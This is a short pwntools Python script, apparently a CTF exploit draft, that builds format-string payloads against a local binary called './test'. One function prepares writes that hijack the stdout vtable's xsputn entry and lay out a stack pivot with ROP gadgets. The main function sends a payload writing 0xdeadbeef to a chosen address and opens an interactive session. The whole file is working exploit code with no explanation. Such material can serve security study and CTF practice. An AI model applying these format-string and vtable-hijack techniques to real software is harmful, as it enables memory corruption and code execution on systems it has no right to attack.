from pwn import *
from fmtstr import fmtstr_payload
context(arch='amd64', log_level='debug')

def main_test():
    base = 0x6cd0e0
    xsputn_offset = 56
    stdout_vtable_addr = 0x6cb3d8
    '''
    writes = {
        base + xsputn_offset: 0x4b95d8,
        stdout_vtable_addr + 1: 0x6cd0
    }
    '''
    pop_rdi_ret = 0x4005d5
    pop_rbp_ret = 0x400a30

    stack_pivot = 0x6ccee0

    writes = {
        base + xsputn_offset: 0x4b95d8,
        stdout_vtable_addr + 1: 0x6cd0,
        stack_pivot: pop_rbp_ret,
        stack_pivot + 8: 0x6cc000,
        stack_pivot + 16: pop_rdi_ret,
        stack_pivot + 24: stack_pivot + 40
    }

    for i in writes.items():
        print(map(hex, i))
    payload = fmtstr_payload(offset=6, writes = writes, write_size='short')
    print(hexdump(payload))
    print("payload len {}".format(len(payload)))

    
def main():
    p = process("./test")
    raw_input()
    writes = {
            0x601010: 0xdeadbeef
    }
    payload = fmtstr_payload(offset=6, writes=writes, write_size='short')
    p.sendline(payload)
    p.interactive()

if __name__ == "__main__":
    main()
